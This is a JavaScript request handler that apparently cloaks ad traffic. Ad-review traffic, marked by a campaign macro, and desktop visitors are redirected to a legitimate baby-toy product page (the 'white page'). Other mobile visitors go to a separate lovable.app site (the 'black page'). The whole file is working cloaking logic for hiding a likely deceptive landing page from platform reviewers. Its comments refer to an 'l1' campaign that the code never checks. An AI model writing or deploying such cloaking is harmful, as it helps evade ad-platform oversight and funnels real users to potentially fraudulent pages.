export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.ubuy.com.sa/en/product/4LMRTPGG4-aboosam-baby-toys-6-to-12-months-musical-learning-infant-toys-12-18-months-babies-ocean-rotating-light-up-toys-for-toddlers-1-2-3-years-old-boys?srsltid=AfmBOop6D-r9YIc9g4OEpu-JPqGFtPpiEs8cRrD7shgAybkIZD27Dre0";
    const blackPageURL = "https://luvcshap.lovable.app/?";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }
































